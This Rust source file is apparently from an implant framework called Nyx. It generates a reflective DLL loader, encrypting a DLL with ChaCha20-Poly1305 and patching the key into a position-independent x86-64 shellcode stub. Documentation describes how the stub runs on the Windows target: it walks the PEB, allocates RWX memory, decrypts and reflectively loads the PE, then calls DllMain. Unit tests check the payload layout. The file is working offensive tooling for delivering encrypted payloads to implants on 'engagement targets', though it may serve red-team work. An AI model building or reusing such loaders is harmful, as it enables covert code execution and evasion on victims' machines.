//! Nyx PIC reflective loader stub generator.
//!
//! This is a **host-side** library (std, build host) that generates the
//! shellcode blob for reflective DLL loading. It does NOT run on the implant —
//! it produces the PIC stub + encrypted DLL payload that the implant receives
//! and executes.
//!
//! ## Architecture
//!
//! ```text
//! build host                           target (implant)
//! ──────────                           ────────────────
//! dll_bytes ──► wrap_payload() ──► blob ──► implant receives blob
//!                 │                              │
//!                 ├─ encrypt DLL (ChaCha20-Poly1305)      │
//!                 ├─ prepend PIC_STUB                     ▼
//!                 └─ append NYX2 header             execute stub
//!                                                         │
//!                                                         ▼
//!                                                    stub self-locates
//!                                                    finds NYX2 magic
//!                                                    reads len + nonce
//!                                                    decrypts (inline
//!                                                     ChaCha20-Poly1305)
//!                                                    reflectively loads PE
//!                                                    calls DllMain
//! ```
//!
//! ## Payload layout
//!
//! ```text
//! ┌──────────────┬──────────────┬──────────────┬──────────────┬──────────────┐
//! │  loader stub │  NYX2 magic  │ encrypted_len│    nonce     │  ciphertext  │
//! │  (variable)  │   (4 bytes)  │  u32 LE (4B) │   (12 bytes) │  (N bytes)   │
//! └──────────────┴──────────────┴──────────────┴──────────────┴──────────────┘
//!                                                              │
//!                                                ┌──────────────┴──────────────┐
//!                                                │  Poly1305 tag (16 bytes)    │
//!                                                └─────────────────────────────┘
//! ```
//!
//! The loader stub length is `LAYER1_BOOTSTRAP.len() + 32 (key) +
//! LAYER2_PEB_WALK.len()` — see [`on_target`] for the per-section byte counts.
//! Total payload size: `stub_len + 4 + 4 + 12 + N + 16 = stub_len + 36 + N`
//! bytes where N = `dll_bytes.len()` (ChaCha20-Poly1305 ciphertext is same
//! length as plaintext).

pub mod dll_probe;
pub mod on_target;
pub mod peb_walk;
pub mod stub;

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Nonce,
};
use on_target::{KEY_LEN, KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_JMP_OFFSET, LAYER2_PEB_WALK};
use rand::RngCore;

// Re-export key constants for callers that need to reason about offsets.
pub use stub::{
    reflective_load, reflective_load_at, ImportResolver, MappedImage, ReflectiveLoadError,
    CIPHERTEXT_OFFSET, ENCRYPTED_LEN_OFFSET, NONCE_OFFSET, NYX2_MAGIC, PIC_STUB_LEN, TAG_LEN,
};

// ── LoaderConfig ────────────────────────────────────────────────────────

/// Configuration for generating a reflective loader payload.
///
/// Holds the encryption key (32 bytes) and nonce (12 bytes) used to protect
/// the embedded DLL. If you call [`LoaderConfig::random`], both are filled
/// from the OS CSPRNG — the caller is responsible for exfiltrating them (e.g.
/// baking them into a per-implant config so the PIC stub can decrypt).
#[derive(Clone, Debug)]
pub struct LoaderConfig {
    /// ChaCha20-Poly1305 encryption key (32 bytes).
    pub key: [u8; 32],
    /// ChaCha20-Poly1305 nonce (12 bytes).
    pub nonce: [u8; 12],
}

impl LoaderConfig {
    /// Create a `LoaderConfig` with the given key and nonce.
    pub fn new(key: [u8; 32], nonce: [u8; 12]) -> Self {
        Self { key, nonce }
    }

    /// Generate a random key + nonce from the OS CSPRNG.
    ///
    /// The caller MUST persist these values somewhere the PIC stub can access
    /// (e.g. baked into per-implant config), otherwise the implant will be
    /// unable to decrypt the embedded DLL.
    pub fn random() -> Self {
        let mut key = [0u8; 32];
        let mut nonce = [0u8; 12];
        rand::rngs::OsRng.fill_bytes(&mut key);
        rand::rngs::OsRng.fill_bytes(&mut nonce);
        Self { key, nonce }
    }
}

// ── Public API ──────────────────────────────────────────────────────────

/// Emit the raw position-independent x86-64 loader stub for `config`.
///
/// The returned bytes are the full on-target shellcode: Layer 1 (self-location,
/// NYX2 magic scan, header parse) immediately followed by the Layer 2
/// decrypt-and-reflect sequence (PEB walk, RWX alloc, inline ChaCha20-Poly1305,
/// reflective PE load, `DllMain` call). The 32-byte `config.key` is baked into
/// the stub at [`on_target::KEY_PATCH_OFFSET`]; the 12-byte `config.nonce` is
/// NOT baked in here — it travels in the NYX2 header that [`wrap_payload`]
/// appends, so the same stub can be re-used with different nonces.
///
/// ## What runs where
///
/// These bytes are PIC x86-64 and execute on the Windows engagement target (no
/// `std`, no loader, no heap). On the macOS dev host they are inert: the
/// byte-level layout is asserted by [`stub_layout`] and the scan algorithm is
/// exercised in pure Rust by [`on_target::find_magic_offset`], but the blob is
/// never invoked. Execution validation is the job of the VPS loader probe
/// (spec §5.5, `scripts/loader_probe.ps1`).
///
/// ## Why a `Vec<u8>` and not `&'static [u8]`
///
/// The key is per-config, so the stub is per-config. The Layer-1 / Layer-2
/// templates are `&'static` constants in [`on_target`]; this function patches
/// the per-config key and the Layer-2 jump displacement into a fresh
/// allocation.
///
/// [`stub_layout`]: ../stub_layout/index.html
pub fn generate_loader_stub(config: &LoaderConfig) -> Vec<u8> {
    // Layout of the emitted stub:
    //   [ LAYER1_BOOTSTRAP ][ key (32B) ][ LAYER2_PEB_WALK ]
    //    ^                   ^             ^
    //    offset 0            KEY_PATCH_OFFSET    KEY_PATCH_OFFSET + KEY_LEN
    //
    // LAYER1_BOOTSTRAP ends with `E9 xx xx xx xx` (jmp rel32) at LAYER2_JMP_OFFSET;
    // the displacement targets the first byte of LAYER2_PEB_WALK. We patch the
    // displacement here so the emitter stays the single source of truth for the
    // per-config layout.
    let mut blob = Vec::with_capacity(LAYER1_BOOTSTRAP.len() + KEY_LEN + LAYER2_PEB_WALK.len());
    blob.extend_from_slice(LAYER1_BOOTSTRAP);

    // Sanity: the bootstrap reserved exactly a 32-byte key slot at the offset
    // the LAYER2 decrypt routine will read from. If a future edit to
    // LAYER1_BOOTSTRAP changes its length, KEY_PATCH_OFFSET tracks it via
    // `const` evaluation, but assert at runtime too as a belt-and-braces guard
    // against a hand-edit.
    debug_assert_eq!(
        blob.len(),
        KEY_PATCH_OFFSET,
        "KEY_PATCH_OFFSET must equal LAYER1_BOOTSTRAP length"
    );

    // Bake the 32-byte ChaCha20 key into the stub. The on-target decrypt
    // routine reads it from `[rip + (KEY_PATCH_OFFSET - here)]`.
    assert_eq!(
        config.key.len(),
        KEY_LEN,
        "LoaderConfig.key must be 32 bytes"
    );
    blob.extend_from_slice(&config.key);

    let layer2_start = blob.len();
    blob.extend_from_slice(LAYER2_PEB_WALK);

    // Patch the `jmp rel32` displacement: target = layer2_start, source of the
    // jump instruction end = LAYER2_JMP_OFFSET + 5 (E9 + 4-byte displacement).
    // rel32 = target - (jmp_instr_end).
    let jmp_instr_end = LAYER2_JMP_OFFSET + 5;
    let rel32 = (layer2_start as isize - jmp_instr_end as isize) as i32;
    blob[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5].copy_from_slice(&rel32.to_le_bytes());

    // Defensive self-match guard: the on-target scanner walks every 4-byte
    // window of the stub looking for NYX2_MAGIC. Layer 1 recovers the magic in
    // eax via XOR (see `on_target::MAGIC_XOR_KEY`) so its *code* can never
    // self-match — but the 32-byte key patched in here is caller-controlled
    // (random, in the common case) and could by chance contain a 4-byte run
    // that spells "NYX2". If it did, the scanner would land inside the key
    // and parse garbage as a header. Catch it at emit time so the caller gets
    // a clear "re-roll the key" error instead of a silent on-target misparse.
    let magic_bytes = NYX2_MAGIC.to_le_bytes();
    for (i, w) in blob.windows(4).enumerate() {
        debug_assert_ne!(
            w,
            &magic_bytes[..],
            "emitted stub contains NYX2_MAGIC at offset {i} (key likely contains a 4-byte \
             match); re-roll LoaderConfig.key"
        );
        // In release builds this is still enforced — a key that embeds the
        // magic produces a broken blob, so panic rather than ship one.
        if w == &magic_bytes[..] {
            panic!(
                "LoaderConfig.key contains a 4-byte run that matches NYX2_MAGIC at stub \
                 offset 0x{i:X}; re-roll the key (the on-target scanner would self-match \
                 and misparse the header)"
            );
        }
    }

    blob
}

/// Encrypt a DLL, prepend the loader stub, and assemble the full NYX2 payload.
///
/// # Layout
///
/// ```text
/// [loader stub (variable, key baked in)][NYX2 magic (4B)]
/// [encrypted_len u32 LE (4B)][nonce (12B)]
/// [ciphertext (dll_bytes.len() bytes)][Poly1305 tag (16B)]
/// ```
///
/// The loader stub is the per-config output of [`generate_loader_stub`] —
/// Layer 1 + Layer 2 with `config.key` baked in. `config.nonce` is carried in
/// the NYX2 header (so the same stub template can be re-used with different
/// nonces); the inline ChaCha20-Poly1305 routine reads it from there at
/// runtime.
///
/// # Arguments
///
/// * `dll_bytes` — the raw PE DLL to encrypt and wrap.
/// * `config` — the key and nonce for ChaCha20-Poly1305 encryption. The key
///   is baked into the emitted stub AND used to encrypt the DLL; the nonce is
///   placed in the NYX2 header AND used to encrypt (so the same nonce is read
///   by both the host-side encrypt and the on-target decrypt).
///
/// # Returns
///
/// A `Vec<u8>` containing the complete payload blob, ready to be delivered
/// to the implant as shellcode.
pub fn wrap_payload(dll_bytes: &[u8], config: &LoaderConfig) -> Vec<u8> {
    // 1. Encrypt the DLL with ChaCha20-Poly1305. The on-target inline decrypt
    //    routine uses the SAME (key, nonce) — key from the stub, nonce from
    //    the NYX2 header — so the ciphertext this produces is exactly what
    //    the stub will turn back into the plaintext PE.
    let cipher = ChaCha20Poly1305::new_from_slice(&config.key)
        .expect("ChaCha20Poly1305 key is always 32 bytes");
    let nonce = Nonce::from_slice(&config.nonce);
    let ciphertext = cipher
        .encrypt(nonce, dll_bytes)
        .expect("ChaCha20-Poly1305 encrypt is infallible");

    // ciphertext = plaintext || 16-byte Poly1305 tag
    // encrypted_len = dll_bytes.len() (ciphertext portion, excluding tag)
    let encrypted_len = dll_bytes.len() as u32;

    // 2. Emit the per-config loader stub (key baked in at KEY_PATCH_OFFSET).
    let stub = generate_loader_stub(config);

    // 3. Assemble: stub + NYX2 header + ciphertext (includes tag)
    let mut payload = Vec::with_capacity(stub.len() + 4 + 4 + 12 + ciphertext.len());
    payload.extend_from_slice(&stub);

    // NYX2 magic (4 bytes, little-endian)
    payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());

    // encrypted_len (4 bytes, little-endian)
    payload.extend_from_slice(&encrypted_len.to_le_bytes());

    // nonce (12 bytes)
    payload.extend_from_slice(&config.nonce);

    // ciphertext || Poly1305 tag
    payload.extend_from_slice(&ciphertext);

    payload
}

// ── Tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use on_target::{KEY_LEN, KEY_PATCH_OFFSET, LAYER1_BOOTSTRAP, LAYER2_PEB_WALK};

    /// A minimal valid PE DLL header for testing (the stub doesn't parse it
    /// yet, but `wrap_payload` encrypts arbitrary bytes).
    fn dummy_dll() -> Vec<u8> {
        // Minimal PE: MZ header + PE signature + empty sections.
        // Just enough bytes to exercise the encrypt/wrap path.
        let mut dll = Vec::new();
        // MZ magic
        dll.extend_from_slice(b"MZ");
        // Padding to make a non-trivial test payload
        dll.extend_from_slice(&[0u8; 62]);
        // PE signature at offset 0x40
        dll.extend_from_slice(b"PE\0\0");
        // Padding
        dll.extend_from_slice(&[0u8; 128]);
        dll
    }

    /// Expected stub length for a given config: Layer 1 + 32-byte key + Layer 2.
    fn expected_stub_len() -> usize {
        LAYER1_BOOTSTRAP.len() + KEY_LEN + LAYER2_PEB_WALK.len()
    }

    #[test]
    fn generate_stub_bakes_in_key_and_matches_template_length() {
        let config = LoaderConfig::random();
        let stub = generate_loader_stub(&config);

        // The stub length is fully determined by the Layer-1 + key + Layer-2
        // template sizes.
        assert_eq!(stub.len(), expected_stub_len());

        // Layer 1 is the prefix, except for the 4-byte rel32 displacement at
        // LAYER2_JMP_OFFSET+1 which the emitter patches to land at Layer 2.
        // Compare the prefix before the jmp, the opcode byte, and the tail of
        // Layer 1 separately.
        use on_target::LAYER2_JMP_OFFSET;
        assert_eq!(
            &stub[..LAYER2_JMP_OFFSET],
            &LAYER1_BOOTSTRAP[..LAYER2_JMP_OFFSET],
        );
        assert_eq!(stub[LAYER2_JMP_OFFSET], 0xE9); // jmp rel32 opcode
                                                   // The 4 bytes after the opcode are the displacement; verify the
                                                   // emitter computed it to land exactly at the Layer-2 start.
        let layer2_start = KEY_PATCH_OFFSET + KEY_LEN;
        let jmp_instr_end = LAYER2_JMP_OFFSET + 5;
        let want_disp = (layer2_start as isize - jmp_instr_end as isize) as i32;
        let got_disp = i32::from_le_bytes(
            stub[LAYER2_JMP_OFFSET + 1..LAYER2_JMP_OFFSET + 5]
                .try_into()
                .unwrap(),
        );
        assert_eq!(got_disp, want_disp, "Layer-1→Layer-2 jmp displacement");
        // Bytes after the jmp up to KEY_PATCH_OFFSET must match the template tail.
        assert_eq!(
            &stub[LAYER2_JMP_OFFSET + 5..KEY_PATCH_OFFSET],
            &LAYER1_BOOTSTRAP[LAYER2_JMP_OFFSET + 5..],
        );

        // The 32-byte key is patched in at KEY_PATCH_OFFSET.
        assert_eq!(
            &stub[KEY_PATCH_OFFSET..KEY_PATCH_OFFSET + KEY_LEN],
            &config.key
        );

        // Layer 2 follows the key verbatim.
        assert_eq!(&stub[layer2_start..], LAYER2_PEB_WALK);
    }

    #[test]
    fn wrap_payload_layout() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        let stub_len = expected_stub_len();
        // stub + 4 (magic) + 4 (enc_len) + 12 (nonce) + dll.len() + 16 (tag)
        let expected_len = stub_len + 4 + 4 + 12 + dll.len() + 16;
        assert_eq!(payload.len(), expected_len);

        // Stub bytes at start equal what generate_loader_stub would emit.
        assert_eq!(&payload[..stub_len], &generate_loader_stub(&config));

        // NYX2 magic immediately after the stub.
        let magic = u32::from_le_bytes(payload[stub_len..stub_len + 4].try_into().unwrap());
        assert_eq!(magic, NYX2_MAGIC);

        // encrypted_len at stub_len + 4.
        let enc_len_off = stub_len + 4;
        let enc_len = u32::from_le_bytes(payload[enc_len_off..enc_len_off + 4].try_into().unwrap());
        assert_eq!(enc_len, dll.len() as u32);

        // nonce at stub_len + 8.
        let nonce_off = stub_len + 8;
        assert_eq!(&payload[nonce_off..nonce_off + 12], &config.nonce);

        // Ciphertext + tag occupies the trailing bytes.
        let ct_off = stub_len + 20;
        assert_eq!(payload[ct_off..].len(), dll.len() + 16);
    }

    #[test]
    fn wrap_payload_encrypts_dll() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        let ct_off = expected_stub_len() + 20;
        // The ciphertext should NOT equal the plaintext DLL.
        let ciphertext_with_tag = &payload[ct_off..];
        assert_ne!(
            &ciphertext_with_tag[..dll.len()],
            dll.as_slice(),
            "ciphertext must differ from plaintext"
        );
    }

    #[test]
    fn roundtrip_decrypt() {
        let config = LoaderConfig::random();
        let dll = dummy_dll();
        let payload = wrap_payload(&dll, &config);

        // Manually decrypt using the same key/nonce to verify roundtrip.
        let cipher = ChaCha20Poly1305::new_from_slice(&config.key).unwrap();
        let nonce = Nonce::from_slice(&config.nonce);

        let stub_len = expected_stub_len();
        // Read encrypted_len from the payload header
        let enc_len =
            u32::from_le_bytes(payload[stub_len + 4..stub_len + 8].try_into().unwrap()) as usize;

        // ciphertext + tag starts right after the nonce
        let ct_off = stub_len + 20;
        let ct_with_tag = &payload[ct_off..ct_off + enc_len + 16];
        let decrypted = cipher
            .decrypt(nonce, ct_with_tag)
            .expect("decrypt should succeed with correct key/nonce");

        assert_eq!(decrypted, dll);
    }

    #[test]
    fn wrap_payload_deterministic() {
        // Same key, nonce, and DLL → same payload (because the baked-in key
        // and the ciphertext are both deterministic functions of the config).
        let key = [0xAAu8; 32];
        let nonce = [0xBBu8; 12];
        let config = LoaderConfig::new(key, nonce);
        let dll = dummy_dll();

        let p1 = wrap_payload(&dll, &config);
        let p2 = wrap_payload(&dll, &config);
        assert_eq!(p1, p2);
    }

    #[test]
    fn wrap_payload_different_nonce_different_ciphertext() {
        let key = [0xCCu8; 32];
        let config1 = LoaderConfig::new(key, [0x11u8; 12]);
        let config2 = LoaderConfig::new(key, [0x22u8; 12]);
        let dll = dummy_dll();

        let p1 = wrap_payload(&dll, &config1);
        let p2 = wrap_payload(&dll, &config2);
        let stub_len = expected_stub_len();

        // The stub portions are identical (key is the same)…
        assert_eq!(&p1[..stub_len], &p2[..stub_len]);
        // …magic and encrypted_len match…
        assert_eq!(&p1[stub_len..stub_len + 8], &p2[stub_len..stub_len + 8]);
        // …the nonce field differs…
        assert_ne!(
            &p1[stub_len + 8..stub_len + 20],
            &p2[stub_len + 8..stub_len + 20]
        );
        // …and the ciphertext differs (different nonce → different keystream).
        assert_ne!(&p1[stub_len + 20..], &p2[stub_len + 20..]);
    }

    #[test]
    fn wrap_payload_different_key_different_stub_and_ciphertext() {
        // Two different keys produce two different stubs (key baked in) and
        // two different ciphertexts. Same nonce to isolate the key's effect.
        let nonce = [0x11u8; 12];
        let config1 = LoaderConfig::new([0xAAu8; 32], nonce);
        let config2 = LoaderConfig::new([0xBBu8; 32], nonce);
        let dll = dummy_dll();

        let p1 = wrap_payload(&dll, &config1);
        let p2 = wrap_payload(&dll, &config2);
        let stub_len = expected_stub_len();

        // The stubs differ in the key region only.
        assert_ne!(&p1[..stub_len], &p2[..stub_len]);
        assert_eq!(&p1[..KEY_PATCH_OFFSET], &p2[..KEY_PATCH_OFFSET]); // Layer 1 same
        assert_eq!(
            &p1[KEY_PATCH_OFFSET + KEY_LEN..stub_len],
            &p2[KEY_PATCH_OFFSET + KEY_LEN..stub_len],
        ); // Layer 2 same
           // Ciphertext also differs (different key).
        assert_ne!(&p1[stub_len + 20..], &p2[stub_len + 20..]);
    }

    #[test]
    fn random_config_produces_different_keys() {
        let c1 = LoaderConfig::random();
        let c2 = LoaderConfig::random();
        // Probability of collision is astronomically low
        assert_ne!(c1.key, c2.key);
    }

    #[test]
    fn empty_dll() {
        let config = LoaderConfig::random();
        let dll: Vec<u8> = vec![];
        let payload = wrap_payload(&dll, &config);

        let stub_len = expected_stub_len();
        // stub + 4 + 4 + 12 + 0 + 16 = stub_len + 36
        assert_eq!(payload.len(), stub_len + 36);

        // encrypted_len should be 0
        let enc_len = u32::from_le_bytes(payload[stub_len + 4..stub_len + 8].try_into().unwrap());
        assert_eq!(enc_len, 0);

        // Decrypt should recover empty DLL
        let cipher = ChaCha20Poly1305::new_from_slice(&config.key).unwrap();
        let nonce = Nonce::from_slice(&config.nonce);
        let decrypted = cipher.decrypt(nonce, &payload[stub_len + 20..]).unwrap();
        assert!(decrypted.is_empty());
    }
}
